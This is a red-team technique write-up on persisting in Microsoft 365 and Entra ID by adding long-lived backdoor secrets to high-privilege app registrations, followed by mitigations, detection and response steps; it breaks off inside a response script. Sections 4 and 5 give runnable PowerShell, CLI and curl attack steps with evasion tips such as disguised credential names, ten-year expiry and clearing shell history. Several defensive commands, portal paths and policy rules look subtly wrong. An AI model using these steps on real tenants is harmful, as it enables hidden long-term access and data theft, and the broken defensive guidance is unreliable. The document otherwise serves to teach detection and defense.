# PERSIST-ACCT-005: Graph API Application Persistence

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-005 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence |
| **Platforms** | M365 / Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All (Platform: Entra ID, M365 tenants with Graph API enabled) |
| **Patched In** | N/A |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
Graph API Application Persistence leverages compromised or attacker-controlled app registrations in Entra ID to maintain long-term access to Microsoft 365 environments. By adding credentials (secrets or certificates) to an application registration with existing Graph API permissions (such as `Mail.Read`, `Directory.ReadWrite.All`, or `RoleManagement.ReadWrite.Directory`), an attacker can authenticate as a service principal and bypass user account detection. This technique is particularly effective because service principals do not require multi-factor authentication (MFA) and can operate silently without generating user login events. Unlike user accounts that may be discovered through anomalous sign-in patterns, service principals with Graph permissions can access resources persistently with minimal forensic evidence.

### Attack Surface
The attack surface includes:
- **Graph API endpoints** accessed via OAuth 2.0 token delegation
- **App registration objects** within Entra ID (accessible via `https://entra.microsoft.com` or PowerShell)
- **Service principal credentials** (client secrets and certificates)
- **Tenant-wide API permissions** granted at the application level (not delegated user consent)

### Business Impact
**Unauthorized data exfiltration, privilege escalation, and sustained tenant compromise.** An attacker with persistent Graph API access can enumerate all users and groups, read mailboxes, create new user accounts, modify policies, and maintain backdoor access even after initial compromise is remediated. This technique was leveraged extensively during the Midnight Blizzard attack against Microsoft, where attackers created malicious OAuth applications to maintain persistent access after compromising legacy test environments.

### Technical Context
Graph API persistence typically takes **2-10 minutes** to establish (once an attacker has compromised an account with app registration permissions). The technique generates minimal direct alerts—modern SIEM solutions may flag credential additions to applications, but only if properly configured. **Detection difficulty: Medium** (requires monitoring of `Add service principal credentials` audit events and `Update application - Certificates and secrets management` operations in unified audit logs). The attack chain typically follows privilege escalation, where an attacker with compromised user credentials or service principal permissions escalates to Global Admin, then creates backdoored applications before cleaning up audit logs.

### Operational Risk
- **Execution Risk:** Low—once access to app registration is obtained, credential creation is straightforward PowerShell or REST API operation
- **Stealth:** Medium—credentials added to existing high-permission applications may blend with legitimate administrative activity
- **Reversibility:** Medium—requires manual credential removal and application auditing; if attacker has created multiple backdoors, remediation is complex

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1.1 | Ensure that Azure AD Multi-Factor Authentication status is 'Enabled' for all non-federated users |
| **CIS Benchmark** | 3.1.3 | Ensure that 'Number of methods required to reset' is set to '2' for MFA |
| **DISA STIG** | V-222644 | The organization must use FIPS-validated cryptographic algorithms for identity and authentication mechanisms. |
| **NIST 800-53** | AC-3 | Access Enforcement – API permissions must be enforced at the application level |
| **NIST 800-53** | AC-6 | Least Privilege – Applications must be granted only necessary Graph API permissions |
| **NIST 800-53** | IA-4 | Identifier Management – Service principal credentials must be uniquely tracked |
| **NIST 800-53** | AU-2 | Audit Events – Credential additions and API access must be logged |
| **NIST 800-53** | SC-7 | Boundary Protection – Graph API calls from service principals must be restricted |
| **GDPR** | Art. 32 | Security of Processing – Organizations must employ encryption and access controls for API credentials |
| **GDPR** | Art. 5(1)(b) | Integrity and Confidentiality – Unauthorized API access violates data integrity assurances |
| **DORA** | Art. 6 | Governance of ICT third-party risk – Third-party API integrations and credentials must be monitored |
| **DORA** | Art. 9 | Protection and Prevention measures – ICT services must have multi-layered credential protection |
| **NIS2** | Art. 21 | Cyber risk management measures – Credential rotation and access control are mandatory controls |
| **NIS2** | Art. 25 | Advanced cybersecurity tools – Organizations must deploy detection systems for API abuse |
| **ISO 27001** | A.9.2.1 | User registration and de-registration – Service principal lifecycle must be managed |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights – Application permissions assignment requires approval |
| **ISO 27001** | A.9.2.6 | Restriction of access to information – API access tokens must be protected and rotated |
| **ISO 27005** | Risk scenario | Compromise of API credentials leading to data exfiltration and privilege escalation |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **For creation**: Owner or Application Administrator role on the target app registration OR Global Administrator role in the tenant
- **For authentication**: Application ID, Tenant ID, and valid client secret or certificate

### Required Access
- Network access to `https://login.microsoftonline.com` (OAuth 2.0 token endpoint)
- Network access to `https://graph.microsoft.com` (Graph API endpoint)
- Ability to execute PowerShell cmdlets OR issue REST API requests (via curl, Postman, or scripting)

### Supported Versions
- **Entra ID:** All versions (cloud-native service, continuously updated)
- **M365:** Office 365 Enterprise, E3+ (mail, calendar, contacts access)
- **PowerShell:** Version 5.0+ (native Windows PowerShell) or PowerShell 7.x (cross-platform)
- **Azure CLI:** Version 2.50.0+
- **Required Modules:**
  - `AzureAD` (deprecated but still functional; use `New-AzureADApplicationPasswordCredential` or `New-AzureADServicePrincipalPasswordCredential`)
  - `Microsoft.Graph` PowerShell SDK (recommended; use `Add-MgApplicationPassword` for modern approaches)
  - `Az.Accounts` and `Az.Resources` for modern Azure CLI workflows

### Tools
- [Microsoft.Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (Version 2.0+)
- [AzureAD PowerShell Module](https://docs.microsoft.com/powershell/azure/active-directory/install-adv2) (Legacy; still functional)
- [Azure CLI](https://learn.microsoft.com/cli/azure/install-azure-cli) (Version 2.50.0+)
- [Postman](https://www.postman.com/) (for REST API testing; optional)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Identify existing app registrations and verify which applications have high-risk Graph permissions.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.Read.All"

# List all app registrations (service principals) in the tenant
Get-MgApplication | Select-Object Id, DisplayName, AppId | Format-Table

# Find apps with high-risk permissions
Get-MgApplication | ForEach-Object {
    $appId = $_.Id
    $displayName = $_.DisplayName
    $requiredResourceAccess = $_.RequiredResourceAccess
    
    # Check for dangerous Graph API permissions
    if ($requiredResourceAccess.ResourceAppId -eq "00000003-0000-0000-c000-000000000000") {
        $dangerousPermissions = @("Directory.ReadWrite.All", "Mail.Read.All", "RoleManagement.ReadWrite.Directory", "User.ManageIdentities.All")
        
        $permissions = $requiredResourceAccess.ResourceAccess | Where-Object { $dangerousPermissions -contains $_.Id }
        
        if ($permissions) {
            Write-Host "RISK: $displayName ($appId) has dangerous permissions"
        }
    }
}

# Check current service principal credentials (requires Admin role)
Get-MgServicePrincipal -All | Where-Object { $_.ServicePrincipalType -eq "Application" } | ForEach-Object {
    $spId = $_.Id
    $displayName = $_.DisplayName
    
    # List credentials
    Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $spId | Select-Object DisplayName, StartDateTime, EndDateTime
}
```

**What to Look For:**
- Applications with **`Directory.ReadWrite.All`**, **`Mail.Read.All`**, **`RoleManagement.ReadWrite.Directory`**, or **`User.ManageIdentities.All`** permissions (these are red flags for persistence)
- Service principals with **multiple credentials** (legitimate apps typically have 1-2; attackers add additional secrets for redundancy)
- Credentials with **far-future expiration dates** (e.g., 5+ years in future; indicates attacker-added credentials)
- **Recently modified** app registrations (check `ModifiedDateTime`)

**Version Note:** This reconnaissance approach works on **all current Entra ID versions**. The `AzureAD` module is deprecated but still functional; `Microsoft.Graph` module is the modern replacement.

### Azure CLI Reconnaissance

```bash
# Login to Azure
az login --allow-no-subscriptions

# List app registrations
az ad app list --output table

# Get details of a specific app
az ad app show --id <ApplicationID> --output json | jq '.displayName, .id'

# List service principals and their credentials
az ad sp list --output table

# Check password credentials on a specific service principal
az ad sp credential list --id <ServicePrincipalID> --output json
```

**What to Look For:**
- Apps with excessive permissions
- Recently added credentials to high-privilege applications
- Service principals with multiple active credentials

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using AzureAD PowerShell Module (Legacy but Reliable)

**Supported Versions:** All Entra ID versions; requires compromise of account with app registration permissions

#### Step 1: Connect to Azure AD with Compromised Credentials

**Objective:** Authenticate as a user or service principal that has owner/administrator permissions on the target app.

```powershell
# Using compromised user credentials
$credential = Get-Credential  # Prompts for username and password
Connect-AzureAD -Credential $credential

# Or using service principal credentials (if attacker already has service principal access)
$password = ConvertTo-SecureString "CompromisedServicePrincipalSecret" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("ApplicationID", $password)
Connect-AzureAD -Credential $credential
```

**Expected Output:**
```
Account               EnvironmentName TenantId                             TenantDomain              AccountType
-------               --------------- --------                             -----------               -----------
user@contoso.onmicr... AzureCloud      xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx contoso.onmicrosoft.com   User
```

**What This Means:**
- Successful connection indicates valid credentials with access to Azure AD
- The `TenantId` will be used in subsequent steps

**OpSec & Evasion:**
- Authenticate from a **compromised internal endpoint** or **VPN** to blend with legitimate traffic
- Execute during **business hours** to avoid anomalous after-hours activity
- Use **PowerShell execution policies** bypass if needed: `powershell.exe -ExecutionPolicy Bypass -NoProfile`
- Consider running from a **temporary user session** that will be deleted before forensic analysis

**Troubleshooting:**
- **Error:** `Connect-AzureAD : AADSTS65001: User or admin has not consented`
  - **Cause:** The AzureAD application requires admin consent on the tenant
  - **Fix:** Use an account with Global Admin role OR request Global Admin to consent to the AzureAD application

#### Step 2: Identify Target Application Registration

**Objective:** Locate the app registration to which you'll add a backdoor credential.

```powershell
# Get all app registrations
$appRegistrations = Get-AzureADApplication

# Find high-privilege applications (preferably ones with existing high-risk permissions)
$appRegistrations | Where-Object {
    $_.DisplayName -like "*admin*" -or $_.DisplayName -like "*service*" -or $_.DisplayName -like "*api*"
} | Select-Object ObjectId, DisplayName, AppId

# Alternatively, target a specific app by name
$targetApp = Get-AzureADApplication -SearchString "YourTargetAppName"
Write-Host "Target App ObjectId: $($targetApp.ObjectId)"
```

**Expected Output:**
```
ObjectId                             DisplayName              AppId
--------                             -----------              -----
aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee ServicePrincipal123      ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj
```

**What This Means:**
- The `ObjectId` is the unique identifier for the app registration within Entra ID
- This ID will be used to add credentials in the next step

**OpSec & Evasion:**
- Target **existing high-permission applications** (reduces suspicious new application creation events)
- Avoid targeting applications with **recent modifications** (indicates active monitoring)
- Prefer **legacy or test applications** that have minimal activity logging

**Troubleshooting:**
- **Error:** `Cannot find any object with identity 'AppName'`
  - **Cause:** Incorrect app name or insufficient permissions
  - **Fix:** Use `Get-AzureADApplication -All $true` to list all apps; then check permissions with `Get-AzureADApplicationOwner`

#### Step 3: Add Backdoor Credential to Application

**Objective:** Create a new secret/password credential that only the attacker knows, enabling persistent authentication.

```powershell
# Add a new password credential with a far-future expiration date
$startDate = Get-Date
$endDate = $startDate.AddYears(10)  # Expires 10 years from now (evades expiration monitoring)

$newCredential = New-AzureADApplicationPasswordCredential `
    -ObjectId $targetApp.ObjectId `
    -CustomKeyIdentifier "SERVTEP-Persistence-001" `
    -StartDate $startDate `
    -EndDate $endDate `
    -Value "Y0uR-Str0ng-P@ssw0rd-Str1ng-H3re!"  # Attacker controls this value

Write-Host "New Credential Created!"
Write-Host "Secret Value: $($newCredential.Value)"
Write-Host "Application ID: $($targetApp.AppId)"
Write-Host "Tenant ID: $(Get-AzureADTenantDetail).ObjectId"
```

**Expected Output:**
```
New Credential Created!
Secret Value: Y0uR-Str0ng-P@ssw0rd-Str1ng-H3re!
Application ID: ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj
Tenant ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- The `Secret Value` is the client secret; this is the credential the attacker will use for authentication
- The `Application ID` and `Tenant ID` form the authentication triplet needed for OAuth token requests
- The secret will not be retrievable after this point; **only the attacker's copy will work**

**OpSec & Evasion:**
- Use **descriptive CustomKeyIdentifier names** that blend with legitimate applications (e.g., "PROD-API-KEY-2024")
- Set expiration date **10+ years in future** to avoid triggering rotation alerts
- Use **strong, random passwords** to avoid brute-force attacks on the credential
- Store credentials in an **offline vault** (not in plaintext scripts or source code)

**Troubleshooting:**
- **Error:** `New-AzureADApplicationPasswordCredential : Insufficient privileges`
  - **Cause:** Compromised account lacks Owner permissions on the app
  - **Fix:** Use an account with Global Admin role OR app Owner role

#### Step 4: Authenticate as Service Principal Using New Credential

**Objective:** Test that the new credential works by obtaining a Graph API access token.

```powershell
# Acquire an access token using the new credential
$tokenBody = @{
    Grant_Type    = "client_credentials"
    Scope         = "https://graph.microsoft.com/.default"
    Client_Id     = $targetApp.AppId
    Client_Secret = "Y0uR-Str0ng-P@ssw0rd-Str1ng-H3re!"
}

$tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$(Get-AzureADTenantDetail).ObjectId/oauth2/v2.0/token" `
    -Method POST `
    -Body $tokenBody

$accessToken = $tokenResponse.access_token
Write-Host "Access Token Acquired:"
Write-Host $accessToken

# Use token to query Microsoft Graph (e.g., list all users)
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type"  = "application/json"
}

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=5" `
    -Headers $headers -Method GET | ConvertTo-Json
```

**Expected Output:**
```
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users",
  "value": [
    {
      "id": "11111111-2222-3333-4444-555555555555",
      "userPrincipalName": "user1@contoso.com",
      "displayName": "User One",
      ...
    }
  ]
}
```

**What This Means:**
- Successful token acquisition and API query confirms the backdoor is functional
- The service principal can now access **all resources** that the application's permissions allow (e.g., read all mailboxes, create users, assign roles)

**OpSec & Evasion:**
- Test the credential from a **legitimate corporate network** (not from a suspicious external IP)
- Execute API calls **within normal business hours** to avoid anomalous activity alerts
- Use **legitimate-sounding query patterns** (e.g., list users, read mailbox) rather than immediately escalating privileges

**Troubleshooting:**
- **Error:** `invalid_client: The OAuth client was not found`
  - **Cause:** Incorrect Application ID or Tenant ID
  - **Fix:** Verify the AppId and TenantId are correct; use `Get-AzureADApplication` to confirm

---

### METHOD 2: Using Microsoft.Graph PowerShell SDK (Modern Approach)

**Supported Versions:** All Entra ID versions; requires Az.Accounts and Microsoft.Graph modules

#### Step 1: Connect to Microsoft Graph with Proper Scopes

**Objective:** Authenticate using modern Microsoft Graph API with delegated or application permissions.

```powershell
# Install required modules if not present
Install-Module Microsoft.Graph -Scope CurrentUser -Force
Install-Module Az.Accounts -Scope CurrentUser -Force

# Connect with delegated permissions (user context)
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# Or connect with application permissions (service principal context)
$tenantId = "your-tenant-id"
$clientId = "your-app-id"
$clientSecret = ConvertTo-SecureString "your-secret" -AsPlainText -Force

Connect-MgGraph -TenantId $tenantId -ClientId $clientId -ClientSecret $clientSecret
```

**Expected Output:**
```
Welcome To Microsoft Graph PowerShell!

You are now signed in to tenant 'contoso.onmicrosoft.com'
```

**OpSec & Evasion:**
- Use **delegated permissions** when compromising a user account (appears as user activity)
- Use **application permissions** when already in service principal context (harder to attribute to a user)

#### Step 2: Identify and Enumerate Target Application

**Objective:** Find the application registration with high-privilege Graph permissions.

```powershell
# Get all applications and their permission assignments
$apps = Get-MgApplication -All

foreach ($app in $apps) {
    $permissions = Get-MgApplicationPermission -ApplicationId $app.Id
    
    if ($permissions.Name -match "Directory.ReadWrite.All|Mail.Read.All|RoleManagement.ReadWrite.Directory") {
        Write-Host "High-Risk App: $($app.DisplayName) (ID: $($app.Id))"
        Write-Host "Dangerous Permissions: $($permissions.Name -join ', ')"
    }
}

# Get specific app by name
$targetApp = Get-MgApplication -Filter "displayName eq 'YourTargetAppName'"
Write-Host "Target App ID: $($targetApp.Id)"
```

**OpSec & Evasion:**
- Target **existing applications** with high permissions rather than creating new ones
- Query permissions **during off-hours** to avoid real-time alerting

#### Step 3: Add Password Credential to Application

**Objective:** Add a new secret/password that the attacker controls.

```powershell
# Define credential parameters
$passwordCredentialParams = @{
    DisplayName = "PROD-API-KEY-2024-Q1"  # Blend with legitimate naming conventions
    EndDateTime = (Get-Date).AddYears(10)  # 10-year expiration
}

# Add the password credential to the application
$newCredential = Add-MgApplicationPassword -ApplicationId $targetApp.Id @passwordCredentialParams

Write-Host "New Credential Added!"
Write-Host "Secret Value: $($newCredential.SecretText)"  # SecretText is displayed only once
Write-Host "Credential ID: $($newCredential.KeyId)"
Write-Host "Expires: $($newCredential.EndDateTime)"
```

**Expected Output:**
```
New Credential Added!
Secret Value: mcl1RQm2H~7K-example-secret-value_
Credential ID: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
Expires: 1/9/2036 3:14:15 PM
```

**OpSec & Evasion:**
- Choose **nondescript names** for credentials (e.g., "PROD-API-KEY-2024" instead of "Attacker-Backdoor")
- Set **long expiration dates** (5-10 years) to minimize detection from expiration monitoring
- Store the credential in a **secure offline location** (password manager, encrypted file)

---

### METHOD 3: Using Azure REST API via cURL (Cross-Platform)

**Supported Versions:** All Entra ID versions; requires internet access and no module dependencies

#### Step 1: Obtain Access Token (As Compromised User or Service Principal)

**Objective:** Get a Graph API access token using OAuth 2.0 client credentials grant.

```bash
#!/bin/bash

# Variables
TENANT_ID="your-tenant-id"
CLIENT_ID="your-application-id"
CLIENT_SECRET="your-client-secret"
TOKEN_ENDPOINT="https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token"

# Request access token
TOKEN_RESPONSE=$(curl -s -X POST "$TOKEN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials")

# Extract access token from response
ACCESS_TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.access_token')

echo "Access Token: $ACCESS_TOKEN"
```

**Expected Output:**
```
Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ijl...
```

**OpSec & Evasion:**
- Use **HTTPS only** (POST requests are encrypted)
- Avoid logging the full token in shell history: use `.curl-history` file with restricted permissions

#### Step 2: Add Password Credential via Microsoft Graph REST API

**Objective:** Create a new secret credential on the target application.

```bash
#!/bin/bash

# Variables (from previous step)
APPLICATION_ID="target-app-object-id"
GRAPH_ENDPOINT="https://graph.microsoft.com/v1.0/applications/$APPLICATION_ID/addPassword"

# Create request body
REQUEST_BODY=$(cat <<EOF
{
  "passwordCredential": {
    "displayName": "PROD-API-KEY-2024-Q1",
    "endDateTime": "2036-01-09T00:00:00Z"
  }
}
EOF
)

# Add password credential
ADD_CREDENTIAL_RESPONSE=$(curl -s -X POST "$GRAPH_ENDPOINT" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "$REQUEST_BODY")

# Extract and display the new secret
NEW_SECRET=$(echo $ADD_CREDENTIAL_RESPONSE | jq -r '.secretText')

echo "New Secret Value: $NEW_SECRET"
echo "Full Response:"
echo $ADD_CREDENTIAL_RESPONSE | jq '.'
```

**Expected Output:**
```json
{
  "customKeyIdentifier": null,
  "displayName": "PROD-API-KEY-2024-Q1",
  "endDateTime": "2036-01-09T00:00:00Z",
  "hint": "mc...le",
  "keyId": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
  "secretText": "mcl1RQm2H~7K-example-secret-value_",
  "startDateTime": "2025-01-09T14:32:45.1234567Z"
}
```

**OpSec & Evasion:**
- Execute from a **Linux/Mac host** to avoid Windows EDR/logging
- Use **pipe operators** to avoid storing secrets in temporary files: `echo $SECRET | command`
- Clean up command history: `history -c && history -w`

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1.1: Implement Application-Level Permission Restrictions**

Restrict which applications can be granted dangerous Graph API permissions. Block permissions like `Directory.ReadWrite.All`, `Mail.Read.All`, and `RoleManagement.ReadWrite.Directory` unless explicitly required.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise Applications** → **Application Permissions Policies**
2. Click **+ New Policy**
3. **Policy Name:** `Block Dangerous Graph Permissions`
4. **Target Applications:** Select "All cloud apps"
5. **Conditions:**
   - Permissions include: `Directory.ReadWrite.All`, `Mail.Read.All`, `RoleManagement.ReadWrite.Directory`
6. **Action:** `Block application from being granted these permissions`
7. Click **Create**

**Alternatively (PowerShell):**
```powershell
# Create an app permission policy (built-in Entra ID feature)
# This requires Entra ID Premium P1

# Get all applications with dangerous permissions
$dangerousApps = Get-MgServicePrincipal -All | Where-Object {
    $_.AppRoles | Where-Object { $_.Value -in @("Directory.ReadWrite.All", "Mail.Read.All") }
}

# Remove dangerous permissions from non-critical applications
foreach ($app in $dangerousApps) {
    if ($app.DisplayName -notmatch "(Admin|System|Core)") {
        # Requires manual intervention to update required resource access
        Write-Host "Review and reduce permissions for: $($app.DisplayName)"
    }
}
```

**Validation Command (Verify Fix):**
```powershell
# Check that dangerous permissions are restricted
Get-MgApplicationPermission -All | Where-Object {
    $_.Name -in @("Directory.ReadWrite.All", "Mail.Read.All")
} | Select-Object DisplayName, PermissionName
```

**Expected Output (If Secure):**
```
DisplayName                PermissionName
-----------                --------------
(Empty or minimal results)
```

---

**Mitigation 1.2: Enforce Multi-Factor Authentication for All Service Principals**

Service principals bypass MFA by design. However, you can enforce MFA-equivalent protections via Conditional Access policies that target service principals.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New Policy**
3. **Name:** `Require Certificate-Based Auth for Service Principals`
4. **Assignments:**
   - **Users:** `All guest and external users` (to catch cross-tenant service principals)
   - **Apps:** Select high-risk applications
5. **Conditions:**
   - **Client apps:** `Other clients`
   - **Device platforms:** `All platforms`
6. **Access Controls:**
   - **Grant:** `Require device to be marked as compliant` OR `Require approved client app`
7. Enable policy: **On**
8. Click **Create**

**Validation Command (Verify Fix):**
```powershell
# Check Conditional Access policies
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State

# Verify service principal token requests are logged
Search-UnifiedAuditLog -Operations "UserLoggedIn" -ResultSize 1 | Select-Object UserIds, ClientAppUsed
```

---

**Mitigation 1.3: Implement Credential Rotation Policy**

Force automatic rotation of service principal credentials to limit the window of exposure if a secret is compromised.

**Manual Steps (PowerShell with Azure Automation or Logic Apps):**
```powershell
# Create a scheduled task to rotate service principal secrets

# Step 1: Create an Azure Automation Account
# Navigate to Azure Portal → Automation Accounts → + Create

# Step 2: Create a Runbook to rotate credentials
$runbookScript = @"
param(
    [string]`$ApplicationId,
    [string]`$TenantId,
    [int]`$MaxAgeInDays = 90
)

# Connect to Azure
Connect-AzAccount -Identity

# Get the application
`$app = Get-AzADApplication -ApplicationId `$ApplicationId

# Get existing password credentials
`$credentials = Get-AzADAppCredential -ApplicationObjectId `$app.Id

# Check if any credential is older than MaxAgeInDays
foreach (`$cred in `$credentials) {
    `$age = (Get-Date) - `$cred.StartDate
    
    if (`$age.Days -gt `$MaxAgeInDays) {
        Write-Host "Credential is `$(`$age.Days) days old. Rotating..."
        
        # Remove old credential
        Remove-AzADAppCredential -ApplicationObjectId `$app.Id -KeyId `$cred.KeyId -Force
        
        # Create new credential
        `$newCred = New-AzADAppCredential -ApplicationObjectId `$app.Id -EndDate (Get-Date).AddYears(1)
        
        # Store new credential securely (e.g., in Azure Key Vault)
        Write-Host "New credential created: `$(`$newCred.SecretText)"
    }
}
"@

# Deploy to Azure Automation
# (Manual step: Create Automation Account, create Runbook, configure Schedule)
```

**Validation Command (Verify Fix):**
```powershell
# Check that credentials are being rotated
Get-AzADAppCredential -ApplicationObjectId "<app-id>" | ForEach-Object {
    $age = (Get-Date) - $_.StartDate
    Write-Host "Credential age: $($age.Days) days"
}
```

---

### Priority 2: HIGH

**Mitigation 2.1: Audit and Review Application Permissions Regularly**

Conduct quarterly reviews of all app registrations and their assigned permissions.

**Manual Steps:**
1. **Azure Portal** → **Entra ID** → **App registrations** → **All applications**
2. Click each application → **API permissions**
3. Review:
   - Are all permissions still required?
   - Are permissions scoped to the least privilege?
   - Are delegated vs. application permissions appropriate?
4. **Remove unnecessary permissions** by clicking the **...** menu → **Remove permission**

**PowerShell Script to Audit:**
```powershell
# Export all app permissions to CSV for review
$apps = Get-MgApplication -All

$report = @()

foreach ($app in $apps) {
    $permissions = Get-MgApplicationPermission -ApplicationId $app.Id
    
    foreach ($permission in $permissions) {
        $report += [PSCustomObject]@{
            "AppName" = $app.DisplayName
            "AppId" = $app.Id
            "PermissionName" = $permission.Name
            "PermissionType" = "Application"  # or "Delegated"
            "Owner" = (Get-MgApplicationOwner -ApplicationId $app.Id).DisplayName -join ";"
        }
    }
}

$report | Export-Csv -Path "C:\Reports\AppPermissions_$(Get-Date -Format 'yyyyMMdd').csv"
```

---

**Mitigation 2.2: Implement Credential Expiration Enforcement**

Enforce maximum credential lifetime policies to limit the duration of compromised secrets.

**Manual Steps (Azure Policy):**
1. **Azure Portal** → **Policy** → **Definitions**
2. Create a new policy definition:
   - **Name:** `Enforce service principal credential expiration < 2 years`
   - **Description:** Automatically flag service principal credentials that exceed 2-year lifetime
   - **Rule:** `resources | where type == "Microsoft.Authorization/roleDefinitions" | where properties.passwordCredentials[0].endDateTime > addyears(now(), 2)`
3. Assign policy to all subscriptions/tenants

---

**Mitigation 2.3: Monitor and Alert on Credential Additions**

Detect when new credentials are added to applications (potential backdoor creation).

**Manual Steps (Microsoft Sentinel KQL Query):**
```kusto
// Detect new service principal credentials added
AuditLogs
| where OperationName == "Add service principal credentials"
| extend InitiatedBy = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetResources = tostring(TargetResources[0].displayName)
| project TimeGenerated, InitiatedBy, OperationName, TargetResources, Result
| where TimeGenerated > ago(24h)
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Audit Events:**
- Operation: `Add service principal credentials`
- Operation: `Update application - Certificates and secrets management`
- Operation: `Add delegated permission grant`
- Operation: `Add app role assignment to service principal`

**Suspicious Patterns:**
- New credentials added to existing high-permission applications (e.g., apps with `Directory.ReadWrite.All`)
- Credentials with **unusually long expiration dates** (5+ years; legitimate credentials typically 1-2 years)
- Credentials added by **non-owner accounts** (e.g., Global Admin adding credentials to someone else's app)
- **Multiple credentials** added to the same application within a short time window (indicates redundancy/backup access)

---

### Forensic Artifacts

**Cloud Artifacts (Azure Audit Logs):**
- **Location:** Microsoft Purview Compliance Portal → **Audit** → **Search**
- **Fields:** `OperationName`, `UserPrincipalName`, `TargetResources`, `ModifiedProperties`
- **Example Log Entry:**
  ```json
  {
    "CreationTime": "2025-01-09T14:32:45Z",
    "UserPrincipalName": "attacker@contoso.com",
    "OperationName": "Add service principal credentials",
    "ResourceId": "/applications/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "ModifiedProperties": [
      {
        "Name": "keyId",
        "NewValue": "bbbbbbbb-cccc-dddd-eeee-ffffffffffff"
      }
    ]
  }
  ```

**PowerShell History (Local Endpoint):**
- Location: `C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- Search for: `New-AzureADApplicationPasswordCredential`, `Add-MgApplicationPassword`, `Add-AzADAppCredential`

**Token Artifacts (Memory/Network):**
- Attacker will authenticate using the service principal AppId + Secret to obtain Graph API access tokens
- Tokens are valid for 1 hour; subsequent calls will generate new token requests
- Tokens can be captured via:
  - Network packet capture (HTTPS TLS inspection requires MITM certificate)
  - Browser developer tools (if accessed via browser OAuth flow)
  - Proxy logs (if traffic routes through corporate proxy)

---

### Response Procedures

#### 1. Isolate Compromised Application

**Objective:** Immediately revoke the service principal's access to prevent further misuse.

```powershell
# Disable the service principal
$servicePrincipal = Get-MgServicePrincipal -Filter "appId eq 'ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj'"

Update-MgServicePrincipal -ServicePrincipalId $servicePrincipal.Id -AccountEnabled:$false

Write-Host "Service principal disabled: $($servicePrincipal.DisplayName)"
```

**Manual (Azure Portal):**
1. **Entra ID** → **Enterprise Applications** → Search for the application
2. Click the application → **Properties**
3. **Enabled for users to sign in:** Toggle to **No**
4. Click **Save**

---

#### 2. Collect Evidence

**Objective:** Export audit logs and credential information before deletion.

```powershell
# Export all service principal credentials (to identify backdoor credentials)
$servicePrincipal = Get-MgServicePrincipal -Filter "appId eq 'ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj'"

# Get password credentials
$passwordCredentials = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id

# Get certificate credentials
$certificateCredentials = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $servicePrincipal.Id

# Export to JSON for forensic analysis
$passwordCredentials | ConvertTo-Json | Out-File "C:\Forensics\PasswordCredentials_$(Get-Date -Format 'yyyyMMdd').json"
$certificateCredentials | ConvertTo-Json | Out-File "C:\Forensics\CertificateCredentials_$(Get-Date -Format 'yyyyMMdd').json"

# Export audit logs
Search-UnifiedAuditLog -Operations "Add service principal credentials" -StartDate (Get-Date).AddDays(-90) `
    | Export-Csv -Path "C:\Forensics\AuditLog_AppCredentialsAdded.csv"
```

**Manual (Azure Portal):**
1. **Microsoft Purview Compliance Portal** → **Audit** → **Search**
2. **Filters:**
   - **Operations:** `Add service principal credentials`
   - **Users:** Leave blank to search all users
   - **Date:** Last 90 days
3. Click **Search**
4. Click **Export** → **Download all results** → Save to CSV

---

#### 3. Revoke Compromised Credentials

**Objective:** Remove all backdoor credentials from the application.

```powershell
# Get service principal
